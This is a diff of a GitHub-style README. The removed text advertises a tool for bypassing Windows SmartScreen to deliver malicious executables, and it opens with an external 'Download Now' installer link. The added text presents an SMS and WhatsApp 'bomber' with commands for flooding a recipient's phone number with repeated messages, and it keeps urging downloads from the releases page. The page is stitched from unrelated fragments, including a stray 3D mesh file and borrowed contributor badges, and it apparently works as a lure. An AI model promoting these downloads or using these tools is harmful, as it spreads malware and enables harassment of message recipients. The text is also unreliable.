@@ -1,136 +1,134 @@
-[![Download Now](https://img.shields.io/badge/Download%20Here-Full%20version-purple)](https://telegra.ph/Download-Installer-1305-05-13?y8gqcq5rre76c5m)
+# Muck MASS SMS Sender & WhatsApp Bomber
 
-<p align="center">
-  <a href="http://www.theunwindai.com">
-    <img src="https://github.com/user-attachments/assets/cc26d5d4-1968-4493-822d-67e439886247" width="600" height="300" alt="Unwind AI">
-  </a>
-</p>
+![SMS Sender](https://img.shields.io/badge/SMS%20Sender-v1.0-brightgreen) ![WhatsApp Bomber](https://img.shields.io/badge/WhatsApp%20Bomber-v1.0-orange)
 
-<div align="center">
-<a href="z"><img src="https://img.shields.io/badge/.NET-512BD4?style=for-the-badge&logo=dotnet&logoColor=white"/></a>
-<a href="z"><img src="https://img.shields.io/badge/Visual_Studio-5C2D91?style=for-the-badge&logo=visual%20studio&logoColor=white"/></a>
-<a href="z"><img src="https://img.shields.io/badge/VSCode-0078D4?style=for-the-badge&logo=visual%20studio%20code&logoColor=white"/></a>
-</div>
+Welcome to the **Muck MASS SMS Sender & WhatsApp Bomber** repository! This project provides tools for sending SMS messages through various APIs and gateways. It aims to explore messaging, verification, and spamming techniques, while also showcasing how tools can bypass popular platforms like WhatsApp, Telegram, and Instagram for various purposes.
 
+## Table of Contents
 
-# What is SmartScreen Bypass?
+- [Introduction](#introduction)
+- [Features](#features)
+- [Installation](#installation)
+- [Usage](#usage)
+- [Contributing](#contributing)
+- [License](#license)
+- [Links](#links)
 
-Sakura-Windows-SmartScreen-Bypass-Chrome-Exe-Edge is a tool designed to bypass Windows SmartScreen and execute malicious EXE files while maintaining compatibility with browsers like Chrome and Edge. **Windows SmartScreen Bypass** disables or evades Microsoft's file reputation checks. **Chrome Integration** ensures seamless execution of payloads downloaded via Chrome. **Edge Compatibility** extends support to Microsoft Edge. **EXE File Spoofing** disguises malicious executables as legitimate files. **Anti-Detection Mechanism** prevents triggering antivirus alerts. **Stealth Execution** runs payloads without user notifications. **Certificate Spoofing** adds fake digital signatures for added legitimacy. **Multi-Browser Support** ensures functionality across multiple web browsers, making it versatile for phishing and malware delivery.
+## Introduction
 
-## Media
-https://github.com/user-attachments/assets/002bbd39-a6e7-4387-9a94-47e689c4a978
+In today’s digital age, SMS APIs and gateways play a crucial role in communication. They enable services for messaging, verification, and even spamming. This repository focuses on tools that exploit these systems, particularly SMS bombers and prank apps. While these tools can serve recreational purposes, they can also be misused for malicious hacking.
+
+This project is for educational purposes only. It aims to provide insights into how these tools work and their implications on privacy and security.
 
 ## Features
-* 1 Windows SmartScreen Bypass
-* 2 Chrome Integration
-* 3 Edge Compatibility
-* 4 EXE File Spoofing
-* 5 Anti-Detection Mechanism
-* 6 Stealth Execution
-* 7 Certificate Spoofing
-* 8 Multi-Browser Support
 
+- **SMS Sending**: Send SMS messages using various APIs.
+- **API Integration**: Easily integrate with popular SMS gateways.
+- **Prank Applications**: Create fun and harmless prank applications.
+- **Bypass Mechanisms**: Learn how to bypass restrictions on platforms like WhatsApp and Telegram.
+- **User-Friendly Interface**: Simple commands for easy use.
 
-<p align="center">
-    <img src="https://minkxx-spotify-readme.vercel.app/api?theme=dark&rainbow=true&scan=true&spin=True" alt="Preview">
-</p>
+## Installation
 
-# Installation
+To get started with the Muck MASS SMS Sender, follow these steps:
 
-1. Download Visual Studio 2022
-_using Git Clone Or either download the project or exit the rar. Then Download Visual Studio 2022 Here Link [VisualStudio Download](https://visualstudio.microsoft.com/downloads/)_
-![last1](https://github.com/fikfifkasd/asd2342/assets/80986477/df0c0345-8a39-4bab-83ce-9211c8324283)
-> Download These
-2. OR
-
-![download](https://github.com/fikfifkasd/asd2342/assets/80986477/29a942a4-924c-4a97-9e76-99f49b7ec27a)
-
-
-3. _Then open the sln (Project Solution) file_
-
-![vsgif](https://github.com/fikfifkasd/asd2342/assets/80986477/e6351858-7564-4d41-adce-56b8ad70898c)
-
-4. Find Executable File
-   ```sh
-   /ProjectName/Bin/Debug/Executable.exe
+1. **Clone the Repository**:
+   ```bash
+   git clone https://github.com/chloeinayamabondzo/Muck-MASS-SMS-Sender-Whatsapp-Boomber-k8.git
+   cd Muck-MASS-SMS-Sender-Whatsapp-Boomber-k8
    ```
 
-# How to Use
+2. **Install Dependencies**:
+   Ensure you have the necessary packages installed. You can do this using `pip`:
+   ```bash
+   pip install -r requirements.txt
+   ```
 
-1. **Open the Application**  
-   - Locate the executable file (`.exe`) on your computer and double-click it to launch the program.
+3. **Download and Execute**:
+   You can download the latest release from the [Releases section](https://github.com/chloeinayamabondzo/Muck-MASS-SMS-Sender-Whatsapp-Boomber-k8/releases). Follow the instructions provided there to execute the files.
 
-2. **Select Target and Adjust Settings**  
-   - Choose your desired target or task from the available options.  
-   - Customize any additional settings (e.g., preferences, configurations) to fit your needs.
+## Usage
 
-3. **Generate a Secure Password**  
-   - Use the built-in feature to create a strong password hashed with the **SHA-256 algorithm**. This ensures your password is secure and encrypted.
+Once you have installed the project, you can start using it. Here are some basic commands:
 
-4. **Start the Process**  
-   - Click the **"Start" button** or press `Ctrl + V` to begin the operation.  
-   - When prompted, enter the password you generated in the previous step.
+### Sending SMS
 
-5. **Provide API Key (If Required)**  
-   - If the application needs an API key to function (e.g., for external services), go to the settings and input your valid API key before proceeding.
-
-6. **Start the Server**  
-   - Once everything is configured, start the server. Wait for the connection to be established. A stable connection is necessary for the app to work properly.
-
-7. **Troubleshoot Errors (If Any)**  
-   - If you encounter errors, ensure the following are installed on your system:  
-     - **Node.js**: Download and install it from [nodejs.org](https://nodejs.org).  
-     - **Visual Studio Build Tools**: Install these tools to resolve technical issues. 
-
-
-## Contributing
-<a href="https://opencollective.com/democracyearth/backer/0/website"><img src="https://opencollective.com/democracyearth/backer/0/avatar.svg"></a>
-<a href="https://opencollective.com/democracyearth/backer/1/website"><img src="https://opencollective.com/democracyearth/backer/1/avatar.svg"></a>
-<a href="https://opencollective.com/democracyearth/backer/3/website"><img src="https://opencollective.com/democracyearth/backer/3/avatar.svg"></a>
-<a href="https://opencollective.com/democracyearth/backer/4/website"><img src="https://opencollective.com/democracyearth/backer/4/avatar.svg"></a>
-<a href="https://opencollective.com/democracyearth/backer/5/website"><img src="https://opencollective.com/democracyearth/backer/5/avatar.svg"></a>
-<a href="https://opencollective.com/democracyearth/backer/7/website"><img src="https://opencollective.com/democracyearth/backer/7/avatar.svg"></a>
-<a href="https://opencollective.com/democracyearth/backer/8/website"><img src="https://opencollective.com/democracyearth/backer/8/avatar.svg"></a>
-
-
-## Licence
-
-Project is licenced under the [MIT licence](https://github.com/AvaloniaUI/Avalonia/blob/master/licence.md).
-
-```stl
-solid cube_corner
-  facet normal 0.0 -1.0 0.0
-    outer loop
-      vertex 0.0 0.0 0.0
-      vertex 1.0 0.0 0.0
-      vertex 0.0 0.0 1.0
-    endloop
-  endfacet
-  facet normal 0.0 0.0 -1.0
-    outer loop
-      vertex 0.0 0.0 0.0
-      vertex 0.0 1.0 0.0
-      vertex 1.0 0.0 0.0
-    endloop
-  endfacet
-  facet normal -1.0 0.0 0.0
-    outer loop
-      vertex 0.0 0.0 0.0
-      vertex 0.0 0.0 1.0
-      vertex 0.0 1.0 0.0
-    endloop
-  endfacet
-  facet normal 0.577 0.577 0.577
-    outer loop
-      vertex 1.0 0.0 0.0
-      vertex 0.0 1.0 0.0
-      vertex 0.0 0.0 1.0
-    endloop
-  endfacet
-endsolid
+To send an SMS, use the following command:
+```bash
+python send_sms.py --to <recipient_number> --message "<your_message>"
 ```
 
-<p align="center">
-  <img src="https://github.com/tarikmanoar/tarikmanoar/raw/output/github-snake-dark.svg" alt="snake"></center>
-</p>
+### Sending Multiple SMS
 
+To send multiple SMS messages, you can use:
+```bash
+python send_sms.py --to <recipient_number> --message "<your_message>" --count <number_of_messages>
+```
+
+### Using WhatsApp Bomber
+
+To use the WhatsApp bomber feature:
+```bash
+python whatsapp_bomber.py --to <recipient_number> --message "<your_message>" --count <number_of_messages>
+```
+
+### Important Note
+
+Always ensure that you have permission to send messages to the recipient. Misuse of these tools can lead to legal consequences.
+
+## Contributing
+
+We welcome contributions to enhance this project. Here’s how you can help:
+
+1. **Fork the Repository**: Click on the "Fork" button at the top right corner of the page.
+2. **Create a Branch**: Create a new branch for your feature or fix.
+   ```bash
+   git checkout -b feature/YourFeatureName
+   ```
+3. **Make Your Changes**: Implement your changes.
+4. **Commit Your Changes**: Commit your changes with a clear message.
+   ```bash
+   git commit -m "Add feature: YourFeatureName"
+   ```
+5. **Push to Your Branch**: Push your changes to your fork.
+   ```bash
+   git push origin feature/YourFeatureName
+   ```
+6. **Create a Pull Request**: Open a pull request to merge your changes.
+
+## License
+
+This project is licensed under the MIT License. Feel free to use, modify, and distribute this software. However, be mindful of local laws regarding the use of SMS and messaging tools.
+
+## Links
+
+For more information and to download the latest release, visit the [Releases section](https://github.com/chloeinayamabondzo/Muck-MASS-SMS-Sender-Whatsapp-Boomber-k8/releases). 
+
+![SMS Gateway](https://img.shields.io/badge/SMS%20Gateway-v1.0-blue)
+
+## Topics
+
+This repository covers various topics related to SMS and messaging systems, including:
+
+- Call
+- Hacking
+- Instagram
+- Prank
+- SMS API
+- SMS Bomber
+- SMS Client
+- SMS Gateway
+- SMS Messages
+- SMS Service
+- SMS Verification
+- Spammer
+- Telegram Bot
+- WhatsApp
+
+Feel free to explore these topics and expand your knowledge on SMS technologies.
+
+## Conclusion
+
+The **Muck MASS SMS Sender & WhatsApp Bomber** project serves as a tool for understanding SMS APIs and their potential uses. While it can be fun to experiment with SMS bombers and prank applications, it is essential to use these tools responsibly. Misuse can lead to severe consequences, both legally and ethically. Always respect privacy and ensure that your actions do not harm others.
+
+For more information, check out the [Releases section](https://github.com/chloeinayamabondzo/Muck-MASS-SMS-Sender-Whatsapp-Boomber-k8/releases) and stay updated on the latest features and improvements.
